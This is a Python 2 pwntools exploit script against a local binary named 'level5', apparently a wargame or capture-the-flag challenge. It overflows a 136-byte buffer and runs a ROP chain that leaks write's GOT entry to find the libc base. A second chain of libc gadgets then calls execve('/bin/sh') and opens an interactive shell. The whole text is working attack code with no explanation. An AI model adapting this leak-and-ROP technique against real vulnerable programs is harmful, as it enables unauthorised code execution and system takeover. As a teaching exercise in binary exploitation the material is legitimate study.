from pwn import*
# context.log_level="debug"
p = process('./level5')
elf = ELF('./level5')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

write_got = elf.got['write']
write_plt = elf.symbols['write']

main = elf.symbols['main']

fill=136


print "*************leak write_add**********"
write_lib = libc.symbols['write']
print "write_lib = "+ hex(write_lib)

p.recvuntil("\n")
p.recvuntil('\n')


payload = 'a' * 136
payload += p64(0x40068a) + p64(0) + p64(1) + p64(write_got) + p64(8) + p64(write_got) + p64(1)
payload += p64(0x400670)
payload += 'a' * 0x38
payload += p64(main)
# pwnlib.gdb.attach(p)
# pause()
p.send(payload)
sleep(1)

write_add = u64(p.recv(8))
print "write_add ="+ hex(write_add)

lib_base = write_add - write_lib
print "libc base ="+ hex(lib_base)


print "*********binsh_addr******"
binsh_addr_offset = next(libc.search('/bin/sh')) -libc.symbols['write']
binsh_addr = write_add + binsh_addr_offset
print "binsh_addr = " + hex(binsh_addr)


print "************payload***************"
L1=lib_base+0x00000000000ea69a #: pop rcx ; pop rbx ; ret
L2=lib_base+0x0000000000033544 #: pop rax ; ret
L3=lib_base+0x0000000000021102 #: pop rdi ; ret
L4=lib_base+0x00000000000202e8 #: pop rsi ; ret
L5=0x4005ba #add    %rdi,%rsi  # L5=lib_base+0x0000000000033412 #: add rsi, rdi ; jmp rsi
L6=lib_base+0x00000000000202e8 #: pop rsi ; ret
L7=lib_base+0x00000000000026bf #: syscall

JMP1=lib_base+0x0000000000084caa #: pop r12 ; jmp rax
JMP2=lib_base+0x000000000011437d #: mov rdx, r12 ; call rax
JMP3=lib_base+0x0000000000135876 #: pop rax ; jmp rcx
JMP4=lib_base+0x0000000000135876 #: pop rax ; jmp rcx
JMP5=lib_base+0x0000000000021102 #: pop rdi ; ret

print "L1="+hex(L1)
print "L2="+hex(L2)
print "L3="+hex(L3)
print "L4="+hex(L4)
print "L5="+hex(L5)
print "L6="+hex(L6)
print "L7="+hex(L7)

print "JMP1="+hex(JMP1)
print "JMP2="+hex(JMP2)
print "JMP3="+hex(JMP3)
print "JMP4="+hex(JMP4)
print "JMP5="+hex(JMP5)

p.recvuntil("\n")

buf_addr_str = p.recvuntil('\n')
buf_addr = int(buf_addr_str,16)
print "buf_addr = " + hex(buf_addr)

payload = p64(JMP1)+p64(JMP2)+p64(JMP3)+p64(JMP4)+p64(JMP5)
payload += "\x00"*(fill-5*8) +p64(L1)+p64(L5)+p64(0)+p64(L2)+p64(L5)+p64(L3)+p64(8)+p64(L4)+p64(buf_addr-8)
payload += p64(L5)+p64(0)+p64(0x3b)+p64(binsh_addr)+p64(L6)+p64(0)+p64(L7)

print "\n##########sending payload##########\n"

p.send(payload)
p.interactive()


